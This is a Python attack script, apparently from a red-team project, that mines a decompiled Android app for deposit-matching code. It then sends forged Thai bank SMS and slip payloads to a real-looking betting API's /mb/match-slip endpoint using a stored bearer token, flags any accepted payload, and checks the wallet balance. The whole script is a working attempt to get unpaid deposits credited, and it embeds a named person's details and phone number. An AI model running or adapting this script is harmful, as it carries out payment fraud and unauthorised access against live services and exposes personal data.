#!/usr/bin/env python3
"""probe_apk_matchslip.py — Extract APK payload format for match-slip endpoint.
   Then send the exact APK payload structure to /mb/match-slip.
"""
import pathlib, re, json, requests, time

JADX_BASE = pathlib.Path("/home/kzp/claude-red/nuxt/data/apk/jadx_out_all")
TID  = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
JWT  = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
DEPOSIT_ID = "30083b71-5f1a-4fa7-8309-31b2baf96427"
SLIP1 = "4fe3f863-ba84-4938-98f1-d3015c25688c.jfif"
KBANK_ACCT = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

def hdrs():
    return {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json",
            "template": "vn", "correlationid": f"apkms-{int(time.time())}",
            "languagecode": "th", "Origin": "https://m.vak88z2.com"}

# ── 1. Scan APK for match-slip + deposit-related API calls ───────────────────
print("=== Scanning APK source for match-slip / deposit payloads ===\n")

if not JADX_BASE.exists():
    print(f"  APK dir not found: {JADX_BASE}")
else:
    KEYWORDS = ["match.slip", "matchSlip", "match_slip", "matchDeposit",
                "match.deposit", "deposit.match", "depositMatch",
                "slipMatch", "slip.match", "autoSlip", "auto.slip",
                "auto_slip", "slip_verify", "verifySlip"]

    for f in JADX_BASE.rglob("*.java"):
        try:
            c = f.read_text(errors='ignore')
            for kw in KEYWORDS:
                if kw.lower() in c.lower():
                    start = c.lower().index(kw.lower())
                    ctx = c[max(0, start-200):start+400]
                    print(f"\n  [{f.name}] keyword={kw}")
                    print(f"  {ctx[:500]}")
                    break
        except Exception:
            pass

    # Also look for the exact /mb/match-slip URL
    print("\n=== Searching for /mb/match-slip in APK ===")
    for f in JADX_BASE.rglob("*.java"):
        try:
            c = f.read_text(errors='ignore')
            if "match-slip" in c or "match_slip" in c:
                idx = c.lower().find("match")
                print(f"\n  [{f.name}]:")
                print(f"  {c[max(0,idx-100):idx+300]}")
        except Exception:
            pass

    # Also check ListApi.java specifically
    print("\n=== ListApi.java content ===")
    for f in JADX_BASE.rglob("ListApi.java"):
        print(f"  File: {f}")
        content = f.read_text(errors='ignore')
        print(content[:5000])

# ── 2. Try APK-style SCB SMS payload to /mb/match-slip ─────────────────────
# SCB SMS format typically: "SCB Easy 09/10/26 09:36 +100.00 ธนวัฒน์ พ ref K6B09001"
# APK parses this into structured fields

print("\n=== POST /mb/match-slip with APK-style bank SMS payload ===")
payloads = [
    # Thai SCB SMS format
    {"sms_body": "SCB Easy 09/10/26 09:36 +100.00 ธนวัฒน์ พ ref K6B09001",
     "bank_code": "SCB", "phone": "0543753327"},
    # Parsed fields
    {"amount": 100.00, "bank": "SCB", "datetime": "2026-10-09T09:36:00+07:00",
     "name": "ธนวัฒน์ พุฒอินทร์", "ref": "K6B09001", "phone": "0543753327"},
    # With slip image (as AUTOSLIP)
    {"slip_image": SLIP1, "amount": 100, "bank_code": "SCB",
     "sender_name": "ธนวัฒน์ พุฒอินทร์", "sender_account": "0543753327",
     "deposit_id": DEPOSIT_ID},
    # Webhook-style forwarded from C2
    {"data": {"amount": 100, "bank": "SCB", "name": "ธนวัฒน์ พุฒอินทร์",
              "account": "0543753327", "ref": "K6B09001"},
     "tid": TID, "domain": "m.vak88z2.com"},
]

for payload in payloads:
    r = requests.post(f"{MGAPI}/mb/match-slip", headers=hdrs(),
                      json=payload, timeout=10)
    try:
        body = r.json()
        msg = json.dumps(body, ensure_ascii=False)[:400]
    except Exception:
        msg = r.text[:300]
    print(f"\n  {list(payload.keys())[:3]}: HTTP {r.status_code}: {msg}")
    if r.status_code == 200:
        print("  [!!!] MATCH-SLIP ACCEPTED!")

# ── 3. Balance check ─────────────────────────────────────────────────────────
print("\n=== Wallet balance ===")
r = requests.get(f"{MGAPI}/mb/wallet", headers=hdrs(), timeout=10)
d = r.json() if r.ok else {}
print(f"  Balance: {d.get('balance', '?')}")

print("\n=== DONE ===")
